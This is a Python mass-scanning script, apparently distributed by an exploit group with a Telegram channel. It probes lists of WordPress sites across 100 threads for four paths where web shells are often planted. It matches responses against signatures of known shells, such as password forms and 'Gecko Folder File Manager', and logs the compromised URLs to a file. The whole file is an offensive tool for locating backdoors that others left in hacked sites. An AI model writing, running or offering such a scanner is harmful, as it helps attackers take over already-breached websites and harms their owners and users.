import requests, os, datetime
from multiprocessing.dummy import Pool
from colorama import Fore, init, Style

init(autoreset=True)
now = datetime.datetime.now()
date = now.strftime("%d-%m-%Y")
def FilterURLS(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site
def SixFiveZero(site):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        site = FilterURLS(site)
        Pathlist = [
            '/wp-admin/includes/class-custom-header.php', '/wp-includes/wp-includes_function.php', '/wp-includes/option-module.php', '/wp-content/plugins/wp-theme-editor/include.php'
        ]
        VulnerablePatterns = [
            'pre align=center><form method=post>Password<br><input type=password name=pass',
            "Local file: <input type",
            '<!-- Gecko Folder File Manager -->',
            ">Lock Shell</a></li>"
        ]
        for path in Pathlist:
            url = site + path
            response = requests.get(url, headers=headers, allow_redirects=True, verify=True, timeout=15)
            if any(pattern in response.text for pattern in VulnerablePatterns):
                print(f"\t{Fore.GREEN}[✓]{Style.RESET_ALL} {site} => {Fore.GREEN}VULNERABLE{Style.RESET_ALL}")
                with open(f"WpInc-{date}.txt", "a") as file:
                    file.write(url + "/650.php\n")
            else:
                print(f"{Fore.RED}[✗]{Style.RESET_ALL} {site} => {Fore.RED}NOT VULNERABLE{Style.RESET_ALL}")
    except:
        pass
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f''' 

 ____  _      ____ _____              
/ ___|(_)_  _| ___|__  /___ _ __ ___  
\___ \| \ \/ /___ \ / // _ \ '__/ _ \ 
 ___) | |>  < ___) / /|  __/ | | (_) |
|____/|_/_/\_\____/____\___|_|  \___/ {Fore.RED}WpInc{Style.RESET_ALL}
                                                
    [-Devloped BY @NullHextral, Six5Zero Exploit-]
    [-Join our Telegram channel for exclusive tools.(https://t.me/six5zeroexploit)-]
    ''')
    files = input("Enter List => ")
    try:
        with open(files, 'r', encoding='utf-8') as file:
            sites = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"\t{Fore.RED}[!] File Not Found{Style.RESET_ALL}")
        exit()
    with Pool(100) as nullhextral:
        nullhextral.map(SixFiveZero, sites)
if __name__ == "__main__":
    main()

